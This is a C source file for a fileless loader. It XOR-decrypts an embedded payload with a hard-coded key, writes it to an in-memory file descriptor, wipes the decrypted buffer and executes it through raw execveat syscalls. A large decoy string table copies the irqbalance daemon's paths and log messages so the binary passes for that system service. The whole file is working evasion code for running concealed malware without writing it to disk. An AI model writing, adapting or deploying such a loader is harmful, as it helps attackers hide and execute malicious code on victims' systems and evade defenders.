#include "payload_embedded.h"

#define PK_LEN 8
static const unsigned char PK[] = {0xA7, 0x3D, 0x8B, 0x52, 0xF1, 0x6C, 0xE4, 0x19};

static const char __attribute__((used)) _irq_decoy[] =
    "/proc/interrupts\0"
    "/proc/stat\0"
    "/proc/irq/%i/smp_affinity\0"
    "/proc/irq/%i/node\0"
    "/sys/devices/system/cpu/online\0"
    "/sys/devices/system/cpu/isolated\0"
    "/sys/devices/system/cpu/nohz_full\0"
    "/sys/devices/system/cpu\0"
    "/sys/devices/system/cpu/%s\0"
    "/sys/devices/system/cpu/topology/core_siblings\0"
    "/sys/devices/system/cpu/topology/physical_package_id\0"
    "/sys/devices/system/cpu/cache/index%d/shared_cpu_map\0"
    "/sys/bus/pci/devices\0"
    "/sys/devices/platform/%s/\0"
    "legacy\0" "storage\0" "video\0" "ethernet\0"
    "gbit-ethernet\0" "10gbit-ethernet\0" "virt-event\0" "other\0"
    "Level\0" "Edge\0" "MSI\0" "-event\0" "xen-dyn\0"
    "IRQBALANCE_ONESHOT\0"
    "IRQBALANCE_DEBUG\0"
    "IRQBALANCE_BANNED_CPUS\0"
    "IRQBALANCE_BANNED_CPULIST\0"
    "INVOCATION_ID\0"
    "Balancing is ineffective on systems with a single cpu.  Shutting down\0"
    "This machine seems not NUMA capable.\0"
    "Irqbalance hasn't been executed under root privileges, thus it won't "
    "in fact balance interrupts.\0"
    "WARNING cant open /proc/stat. balancing is broken\0"
    "WARNING read /proc/stat. balancing is broken\0"
    "WARNING, didn't collect load info for all cpus, balancing is broken\0"
    "WARNING: MSI interrupts found in /proc/interrupts\0"
    "But none found in sysfs, you need to update your kernel\0"
    "Until then, IRQs will be improperly classified\0"
    "WARNING: Platform device path in /sys exceeds PATH_MAX, cannot examine\0"
    "IRQ %d has an unknown node\0"
    "Adding IRQ %d to database\0"
    "Cannot change IRQ %i affinity: %s\0"
    "IRQ %i affinity is now unmanaged\0"
    "Package %i:  numa_node\0"
    "Cache domain %i:  numa_node is\0"
    "cpu mask is %s  (load %lu)\0"
    "Interrupt %i node_num is %d (%s/%" "PRIu64" ":%" "PRIu64" ")\0"
    "CPU number %i  numa_node is\0"
    "IRQ %s is of type %d and class %d\0"
    "IRQ %s(%d) guessed as class %d\0"
    "IRQ %d: Override %s to %s\0"
    "Prevent irq assignment to these isolated CPUs: %s\0"
    "Prevent irq assignment to these adaptive-ticks CPUs: %s\0"
    "Prevent irq assignment to these thermal-banned CPUs: %s\0"
    "Banned CPUs: %s\0"
    "No directory %s: %s\0"
    "Checking entry %s\0"
    "package_mask with different physical_package_id found!\0"
    "none\0" "package\0" "cache\0" "core\0"
    "sleep_interval\0" "power_thresh\0" "migrate_ratio\0"
    "deepest_cache\0" "ban irqs\0" "cpus\0"
    "g_main_loop_new\0" "g_main_loop_run\0" "g_main_loop_quit\0"
    "g_timeout_add_seconds\0" "g_unix_signal_add\0" "g_unix_fd_add\0"
    "g_list_append\0" "g_list_length\0" "g_list_free_full\0"
    "g_str_has_prefix\0" "g_malloc\0" "g_free\0"
    "capng_clear\0" "capng_apply\0" "capng_lock\0"
    "numa_available\0"
    "irqbalance\0"
    "irqbalance-ui\0"
;

static inline long _syscall(long n, long a1, long a2, long a3,
                            long a4, long a5, long a6) {
    long ret;
    register long r10 __asm__("r10") = a4;
    register long r8  __asm__("r8")  = a5;
    register long r9  __asm__("r9")  = a6;
    __asm__ volatile("syscall"
        : "=a"(ret)
        : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8), "r"(r9)
        : "rcx", "r11", "memory");
    return ret;
}

#define __NR_write        1
#define __NR_close        3
#define __NR_mmap         9
#define __NR_munmap       11
#define __NR_exit         60
#define __NR_memfd_create 319
#define __NR_execveat     322

#define sys_write(fd, buf, n)  _syscall(__NR_write, (long)(fd), (long)(buf), (long)(n), 0, 0, 0)
#define sys_close(fd)          _syscall(__NR_close, (long)(fd), 0, 0, 0, 0, 0)
#define sys_mmap(len)          _syscall(__NR_mmap, 0, (long)(len), 3, 0x22, -1, 0)
#define sys_munmap(addr, len)  _syscall(__NR_munmap, (long)(addr), (long)(len), 0, 0, 0, 0)
#define sys_memfd_create(name) _syscall(__NR_memfd_create, (long)(name), 1, 0, 0, 0, 0)
#define sys_execveat(fd, path, argv, envp, flags) \
    _syscall(__NR_execveat, (long)(fd), (long)(path), (long)(argv), (long)(envp), (long)(flags), 0)

__attribute__((noreturn))
static inline void sys_exit(int code) {
    _syscall(__NR_exit, (long)code, 0, 0, 0, 0, 0);
    __builtin_unreachable();
}

__asm__(
    ".globl _start\n"
    ".type _start, @function\n"
    "_start:\n"
    "    xor  %rbp, %rbp\n"
    "    mov  %rsp, %rdi\n"
    "    andq $-16, %rsp\n"
    "    sub  $8, %rsp\n"
    "    call _loader_main\n"
    "    ud2\n"
);

__attribute__((noreturn))
void _loader_main(long *sp) {
    int argc    = (int)sp[0];
    char **argv = (char **)(sp + 1);
    char **envp = argv + argc + 1;

    unsigned char *p = (unsigned char *)sys_mmap(payload_data_len);
    if ((long)p < 0) sys_exit(1);

    for (unsigned int i = 0; i < payload_data_len; i++)
        p[i] = payload_data[i] ^ PK[i % PK_LEN];

    int fd = (int)sys_memfd_create("");
    if (fd < 0) { sys_munmap(p, payload_data_len); sys_exit(1); }

    unsigned long w = 0;
    while (w < payload_data_len) {
        long n = sys_write(fd, p + w, payload_data_len - w);
        if (n <= 0) {
            sys_munmap(p, payload_data_len);
            sys_close(fd);
            sys_exit(1);
        }
        w += (unsigned long)n;
    }

    volatile unsigned char *vp = p;
    for (unsigned int i = 0; i < payload_data_len; i++)
        vp[i] = 0;
    sys_munmap(p, payload_data_len);

    sys_execveat(fd, "", argv, envp, 0x1000);

    sys_close(fd);
    sys_exit(1);
}
